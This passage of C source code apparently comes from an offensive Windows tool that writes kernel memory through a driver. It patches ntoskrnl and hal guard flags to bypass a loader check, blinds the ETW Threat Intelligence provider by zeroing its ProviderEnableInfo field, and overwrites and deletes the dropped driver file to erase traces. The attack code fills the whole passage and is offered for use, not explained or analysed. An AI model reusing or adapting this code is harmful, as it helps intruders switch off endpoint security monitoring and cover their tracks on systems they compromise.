        TS_SetError(ctx, "Failed to write hal guard flag");
        return false;
    }

    // Verify writes
    DbgLog("TS_Patch618Flags: Verifying writes...");
    UINT8 verifyNtoskrnlGuard = 0, verifyHalGuard = 0;
    TS_ReadPhys1(ctx, ntoskrnlGuardPA, &verifyNtoskrnlGuard);
    TS_ReadPhys1(ctx, halGuardPA, &verifyHalGuard);

    DbgLog("TS_Patch618Flags: AFTER: ntoskrnl_guard=%u (0x%02X) hal_guard=%u (0x%02X)",
           verifyNtoskrnlGuard, verifyNtoskrnlGuard, verifyHalGuard, verifyHalGuard);

    if (verifyNtoskrnlGuard != 1 || verifyHalGuard != 1) {
        TS_SetError(ctx, "Guard flag verification FAILED: ntoskrnl=%u hal=%u (expected 1)",
                    verifyNtoskrnlGuard, verifyHalGuard);
        return false;
    }

    DbgLog("TS_Patch618Flags: ============================================");
    DbgLog("TS_Patch618Flags: -618 BYPASS SUCCESSFUL!");
    DbgLog("TS_Patch618Flags: Parsing block will be SKIPPED.");
    DbgLog("TS_Patch618Flags: LDR_OPEN should now work!");
    DbgLog("TS_Patch618Flags: ============================================");
    return true;
}

//=============================================================================
// ETW Blinding
//=============================================================================

bool TS_DisableEtwTi(PTS_CTX ctx, UINT64 ntoskrnlBase, UINT64 offset) {
    if (!ctx || !ctx->bInitialized) return false;

    DbgLog("TS_DisableEtwTi: Disabling ETW-TI at ntoskrnl+0x%llX", offset);

    // Calculate address of EtwThreatIntProvRegHandle
    UINT64 regHandleVA = ntoskrnlBase + offset;
    UINT64 regHandlePA = 0;

    if (!TS_VirtToPhys(ctx, 0, regHandleVA, &regHandlePA)) {
        TS_SetError(ctx, "Failed to translate EtwThreatIntProvRegHandle VA");
        return false;
    }

    // Read ETW_REG_ENTRY pointer
    UINT64 regEntry = 0;
    if (!TS_ReadPhys8(ctx, regHandlePA, &regEntry)) {
        TS_SetError(ctx, "Failed to read ETW_REG_ENTRY pointer");
        return false;
    }

    if (regEntry == 0) {
        TS_SetError(ctx, "ETW_REG_ENTRY is null");
        return false;
    }

    // Read ETW_GUID_ENTRY pointer at offset 0x20
    UINT64 guidEntryVA = regEntry + 0x20;
    UINT64 guidEntryPA = 0;
    if (!TS_VirtToPhys(ctx, 0, guidEntryVA, &guidEntryPA)) {
        TS_SetError(ctx, "Failed to translate GuidEntry VA");
        return false;
    }

    UINT64 guidEntry = 0;
    if (!TS_ReadPhys8(ctx, guidEntryPA, &guidEntry)) {
        TS_SetError(ctx, "Failed to read ETW_GUID_ENTRY pointer");
        return false;
    }

    if (guidEntry == 0) {
        TS_SetError(ctx, "ETW_GUID_ENTRY is null");
        return false;
    }

    // ProviderEnableInfo is at offset 0x60
    UINT64 providerEnableVA = guidEntry + 0x60;
    UINT64 providerEnablePA = 0;
    if (!TS_VirtToPhys(ctx, 0, providerEnableVA, &providerEnablePA)) {
        TS_SetError(ctx, "Failed to translate ProviderEnableInfo VA");
        return false;
    }

    // Save current value for restoration
    if (!TS_ReadPhys8(ctx, providerEnablePA, &ctx->EtwSavedValue)) {
        TS_SetError(ctx, "Failed to read ProviderEnableInfo");
        return false;
    }

    DbgLog("TS_DisableEtwTi: ETW-TI current value: 0x%016llX", ctx->EtwSavedValue);

    // Zero it to disable
    if (!TS_WritePhys8(ctx, providerEnablePA, 0)) {
        TS_SetError(ctx, "Failed to write ProviderEnableInfo");
        return false;
    }

    DbgLog("TS_DisableEtwTi: ETW-TI disabled");
    return true;
}

bool TS_EnableEtwTi(PTS_CTX ctx, UINT64 ntoskrnlBase, UINT64 offset, UINT64 savedValue) {
    if (!ctx || !ctx->bInitialized) return false;

    DbgLog("TS_EnableEtwTi: Restoring ETW-TI with value 0x%016llX", savedValue);

    // Same navigation as DisableEtwTi
    UINT64 regHandleVA = ntoskrnlBase + offset;
    UINT64 regHandlePA = 0;

    if (!TS_VirtToPhys(ctx, 0, regHandleVA, &regHandlePA)) {
        TS_SetError(ctx, "Failed to translate EtwThreatIntProvRegHandle VA");
        return false;
    }

    UINT64 regEntry = 0;
    if (!TS_ReadPhys8(ctx, regHandlePA, &regEntry)) {
        TS_SetError(ctx, "Failed to read ETW_REG_ENTRY pointer");
        return false;
    }

    UINT64 guidEntryVA = regEntry + 0x20;
    UINT64 guidEntryPA = 0;
    if (!TS_VirtToPhys(ctx, 0, guidEntryVA, &guidEntryPA)) {
        TS_SetError(ctx, "Failed to translate GuidEntry VA");
        return false;
    }

    UINT64 guidEntry = 0;
    if (!TS_ReadPhys8(ctx, guidEntryPA, &guidEntry)) {
        TS_SetError(ctx, "Failed to read ETW_GUID_ENTRY pointer");
        return false;
    }

    UINT64 providerEnableVA = guidEntry + 0x60;
    UINT64 providerEnablePA = 0;
    if (!TS_VirtToPhys(ctx, 0, providerEnableVA, &providerEnablePA)) {
        TS_SetError(ctx, "Failed to translate ProviderEnableInfo VA");
        return false;
    }

    // Restore saved value
    if (!TS_WritePhys8(ctx, providerEnablePA, savedValue)) {
        TS_SetError(ctx, "Failed to restore ProviderEnableInfo");
        return false;
    }

    DbgLog("TS_EnableEtwTi: ETW-TI restored");
    return true;
}

//=============================================================================
// Cleanup Helpers
//=============================================================================

static void TS_CleanupArtifacts(PTS_CTX ctx) {
    if (!ctx || ctx->wszDriverPath[0] == L'\0') return;

    // Attempt secure deletion
    HANDLE hFile = CreateFileW(
        ctx->wszDriverPath,
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        // Overwrite with zeros
        LARGE_INTEGER fileSize;
        if (GetFileSizeEx(hFile, &fileSize)) {
            UINT8 zeros[4096] = {0};
            LONGLONG remaining = fileSize.QuadPart;
            while (remaining > 0) {
                DWORD toWrite = (DWORD)((remaining < sizeof(zeros)) ? remaining : sizeof(zeros));
                DWORD written = 0;
                WriteFile(hFile, zeros, toWrite, &written, NULL);
                remaining -= written;
            }
        }
        CloseHandle(hFile);
    }

    DeleteFileW(ctx->wszDriverPath);
}
